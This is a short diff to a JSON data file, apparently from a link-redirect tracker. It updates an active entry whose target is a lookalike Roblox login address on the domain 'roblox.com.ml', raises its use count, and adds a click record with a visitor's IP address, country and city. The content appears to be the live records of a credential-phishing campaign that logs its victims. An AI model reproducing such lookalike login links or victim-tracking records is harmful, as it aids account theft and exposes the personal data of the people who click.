@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 154,
+    "useCount": 155,
     "createdBy": "admin",
     "clicks": [
       {
@@ -1344,6 +1344,14 @@
         "city": "Bangkok",
         "flag": "🇹🇭",
         "countryCode": "TH"
+      },
+      {
+        "timestamp": 1776955523186,
+        "ip": "152.173.91.172",
+        "country": "Chile",
+        "city": "Antofagasta",
+        "flag": "🇨🇱",
+        "countryCode": "CL"
       }
     ]
   },
